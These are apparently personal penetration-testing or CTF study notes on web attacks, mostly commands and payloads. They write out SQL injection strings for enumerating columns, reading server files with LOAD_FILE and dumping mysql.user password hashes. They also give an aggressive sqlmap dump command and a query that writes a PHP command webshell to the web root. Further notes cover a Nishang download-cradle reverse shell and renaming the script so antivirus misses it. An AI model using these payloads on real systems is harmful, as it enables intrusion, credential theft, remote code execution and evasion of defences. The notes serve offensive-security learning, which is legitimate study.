R
- always scan from port 0 to 65535 like this -p0-65535 in nmap scans , port 0 can also be used in some ctf environment 

- copyright date can also reveal the date of creation and help in finding public exploits 

-  we should enable include server response in burp to build the site map while exploring the web application and also remember the largest attack surface is web application 

### BYPASSING ACL OF HEADER-PROXY

ACCESS CONTROL VIA HEADER , SOMETIMES WHEN IT REQUIRE A PROXY IN BETWEEN TO ACCESS THE WEBPAGE , 
- header can be FUZZED via wfuzz feroxbuster etc 

```shell
sudo wfuzz -c -v -t 50 -u <URL> -w <wordlist-1> -w <wordlist-2> -H  FUZZ:FUZ2Z -hh <char-to-filer>
```


**python script to print all the host in a subnet** 
```python
#!/usr/bin/python3
from netaddr import IPNetwork
for ip in IPNetwork("192.168.4.0/24"):
	pirnt(ip)
```

AFTER FINDING THE EXACT HEADER TO BYPASS WE NEED TO INCLUDE THAT HEADER IN EVERY HTTP REQUEST 
 
##### BURP CONFIG TO INCLUDE THE HEADER IN EVERY REQUEST 

```BURP
OPTIONS -> MATCH AND REPLACE RULE -> REPLACE (DONT ADD ANYTING IN MATCH THIS WILL APPEND THE HEADER IN EVERY REQUEST) -> HEADER(X-FORWARDED-FOR:<IP>)
```

TO MAKE THINGS EASY , WE CAN **ADD A MATCHING RULE IN RESPONSE OF EVERY REQUEST** , WE GOT ERROR BASES SQLi SO WE NEED TO SCROLL TO THE END EVERY TIME 

```BURP
RESPONSE-TAB -> ADD-A-MATCH-FILTER -> SETTINGS -> CHECK-THE-(AUTO-SCROLL-TO-MATCH)
```

### ERROR-BASED SQLi 

**ORDER BY**
- FIND THE TOTAL NUMBER OF COLUMNS 
- ```sql
  p' ORDER BY 10 -- -
  ```
- DECREASE THE NUMBER OF ORDER BY FROM 10 , IF IT GIVES ERROR 
- THE NUMBER AT WHICH WE DONT GET ANY ERROR THATS THE TOTAL NUMBER OF COLUMN 
- `-- -` THIS IS THE COMMENT THE REMAINING QUERY AFTER THE INJECTION WILL BE COMMENTED OUT 

**UNION ATTACK**
- FINDING WHICH COLUMN SUPPORTS STRING DATA TYPE

![[Pasted image 20260329200141.png]]

```
p' UNION SELECT 1,2,3,4,5,6-- -
p' UNION SELECT user(),2,3,4,5,6-- -
```

if the above command gives username we found the string datatype column for injection 

```
p' UNION SELECT database(),2,3,4,5,6-- -
p' UNION SELECT @@version,2,3,4,5,6-- -
```

- **exfiltrating files**
```
p' UNION SELECT LOAD_FILE('C:\\inetpub\\wwwroot\index.php'),2,3,4,5,6-- -
```
the above query will might not work we need to stay focused on number of bytes it returned , and its php so it might not show us the source code 

**base64 encode the exfilterting files**
```
p' UNION SELECT TO_BASE64(LOAD_FILE('C:\\inetpub\\wwwroot\index.php')),2,3,4,5,6-- -
```
THIS WILL SHOW US THE ENCODED FILE , THAT WE CAN DECODE TO SEE THE SOURCE CODE 

**the INFORMATION_SCHEMA_SCHEMATA TABLE**
GOING DEEP FOR ENUMERATION 
- information about databases its a metadata that mysql store about databases 
```mysql
p' UNION SELECT (SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA),2,3,4,5,6-- -
```
A SUB STRING IN UNION TO SELECT ALL THE DATABASE TABLE , BUT WE WILL GET **CARDINALITY ERROR**
- WHEN THE EXPECTED AREA OF RESULTING COLUMN IS ONE AND WE ARE RETURNING MORE THAN ONE COLUMN 
- TO RESOLVE THIS WE NEED TO CONCAT THE RESULT INTO ONE SINGLE COLUMN AKA AGGREGATION FUNCTIONS IN MYSQL 

**GROUP_CONCAT**

```MYSQL
p' UNION SELECT (SELECT group_concat(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA),2,3,4,5,6-- -
```

![[Pasted image 20260331183928.png]]

```mysql
p' UNION SELECT (SELECT group_concat(SCHEMA_NAME SEPERATOR '\n') FROM INFORMATION_SCHEMA.SCHEMATA),2,3,4,5,6-- -
```

- most often we will see <mark class="hltr-mycolor">mysql database</mark> which contain <mark class="hltr-green-flag">user table</mark> containing users and password column 

```mysql
p' UNION SELECT (SELECT group_concat(user, password SEPERATOR '\n') FROM mysql.user),2,3,4,5,6-- -
```

**finding | cracking password hashes**
```shell
sudo hashid <HASH>
```
THIS WILL TELL US THE ALGORITHM USED TO HASH BY ANALYZING THE HASH

**hashkiller.io** | **crackstation.**
- ALWAYS FIRST USE ONLINE WEBSITES TO CRACK HASHES , THEY CONTAIN RAINBOW TABLE WHICH WE CAN USE TO FIND ALREADY CRACKS HASHES ,
- THE DRAWBACK HERE IS IF THE HASH IS SALTED WE WILL NOT GET THE PASSWORD BACK , WE NEED TO USE HASHCAT OR JOHN TO CRACK IT OPEN , 
---
#### AUTOMATED SQLi WITH SQLMAP
- we need a request file which contain the exact request needed to poke sqli in the target webapp , we can copy the request in the burp 

**SQLMAP ADVANCE HELP**
```BASH
sudo sqlmap -hh
```

- AGGRESSIVE SQLi AUTOMATION 
```BASH
sudo sqlmap -r <request-file> --batch --level=5 --risk=3 --dump-all
```

---

**WRITING A FILE VIA SQLi**

- WE CAN WRITE THE FILE VIA SELECT INTO STATEMENT BUT ITS TOO COMMON AND MAYBE DETECTED EASYLY
```MYSQL
SELECT ... INTO OUTFILE
```

- <mark class="hltr-green-flag">THE FOLLOWING DUMPFILE TECHNIQUE IS NOT COMMON</mark> 
```MYSQL
SELECT ... INTO DUMPFILE 'FILEPATH'
```

```MYSQL
p' UNION SELECT ('foo'),2,3,4,5,6-- -
```
this will print foo on the output it means the first column is our input 

**INTO DUMPFILE - WRITING A WEBSHELL OVER SQLi**
```mysql
p' UNION SELECT ('<?php phpinfo(); ?>'),2,3,4,5,6 INTO DUMPFILE 'C:\\inetpub\\wwwroot\\upload.php'-- -
```

**PHP WEBshell**
- WITH THE HELP OF PHP SUPERGLOBAL VARIABLE WE USED c AS ARGUMENT TO THE FUNCTION CALLED system THE SUPERGLOBAL $\_REQUEST[] STORES THE VALUE FROM QUERY STRING IN THE URL , WE CAN CHANGE THIS TO POST REQUEST IN BURP 
```MYSQL
p' UNION SELECT ('<?php system($_REQUEST['c']); ?>'),2,3,4,5,6 INTO DUMPFILE 'C:\\inetpub\\wwwroot\\upload.php'-- -
```

#### GETTING A REVERSE SHELL

WE USED THE DOWNLOAD CREDLE TECHNIQUE TO HOST A NISHANG POWERSHELL SCRIPT AND THEN USED IEX download credle to run that script directly , 
in the combination of nishang and download credle , we always needed to append the command 
we also needed to change the name of the script bcz of AV being detecting static string , 


## MISC

```
sudo sed -i 's/Invoke-PowershellTcp/foo/gI' <filename> 
```
-i means inplace s means subsitute g means global and I means case insensitive 